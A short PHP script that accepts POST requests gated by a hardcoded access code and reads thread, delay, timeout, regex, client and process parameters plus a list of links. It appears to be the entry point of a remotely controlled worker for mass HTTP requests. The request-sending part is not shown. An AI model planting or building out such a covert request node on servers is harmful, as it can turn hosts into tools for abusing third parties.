<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: text/html; charset=utf-8');
set_time_limit(900);
$hashcode = '7a3cb9bdfa';
if(isset($_POST['hc']) && $_POST['hc'] == $hashcode && isset($_POST['threads']) && is_numeric($_POST['threads']) && isset($_POST['delay']) && is_numeric($_POST['delay']) && isset($_POST['timeout']) && is_numeric($_POST['timeout']) && isset($_POST['request']) && is_numeric($_POST['request']) && isset($_POST['requestbody']) && isset($_POST['regex']) && isset($_POST['regex_logic']) && is_numeric($_POST['regex_logic']) && isset($_POST['onlybody']) && is_numeric($_POST['onlybody']) && isset($_POST['onlyheaders']) && is_numeric($_POST['onlyheaders']) && isset($_POST['links_ar']) && isset($_POST['client_id']) && is_numeric($_POST['client_id']) && isset($_POST['proc_id']) && is_numeric($_POST['proc_id'])) 
{
echo '1'."\n";
//print_r($_POST);
$all_links = explode('_||_',$_POST['links_ar']);
	if(function_exists('fsockopen')) $vffsockopen = '1';
	else $vffsockopen = '2';
}
else 
{
echo '2'."\n";
//print_r($_POST);
exit();
}
?>